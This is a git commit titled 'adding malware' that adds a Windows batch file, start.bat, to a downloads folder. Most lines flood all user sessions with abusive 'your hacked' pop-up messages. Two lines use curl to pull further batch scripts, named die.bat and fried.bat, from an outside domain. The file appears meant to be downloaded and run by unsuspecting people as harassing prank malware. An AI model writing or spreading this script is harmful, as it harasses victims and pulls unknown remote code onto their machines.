2bc6c372d2002da54f7cb4df82c50c5aed8f094e
jt24691 <79530128+jt24691@users.noreply.github.com>
2024-04-28 01:25:25 -0400

    adding malware

---
+++ downloads/start.bat
@@ -0,0 +1,24 @@
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+curl https://sevenfingeredpianist.xyz/downloads/die.bat
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+curl https://sevenfingeredpianist.xyz/downloads/fried.bat
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * your hacked, Bitch
+MSG * Your hacked, Bitch
+MSG * your hacked, Bitch
